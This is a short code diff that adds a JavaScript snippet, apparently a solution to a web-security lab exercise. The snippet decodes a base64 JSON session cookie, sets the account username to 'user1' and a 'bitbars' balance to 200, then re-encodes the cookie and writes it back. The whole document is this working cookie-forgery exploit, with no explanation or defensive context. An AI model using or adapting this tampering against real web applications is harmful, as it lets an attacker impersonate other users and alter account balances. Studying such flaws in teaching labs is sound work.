@@ -1,0 +1,6 @@
+const cookie_str = document.cookie;
+var decoded_cookie = JSON.parse(atob(cookie_str.slice(8)));
+decoded_cookie.account.username = "user1";
+decoded_cookie.account.bitbars = 200;
+const modified_cookie = "session="+btoa(JSON.stringify(decoded_cookie));
+document.cookie = modified_cookie;
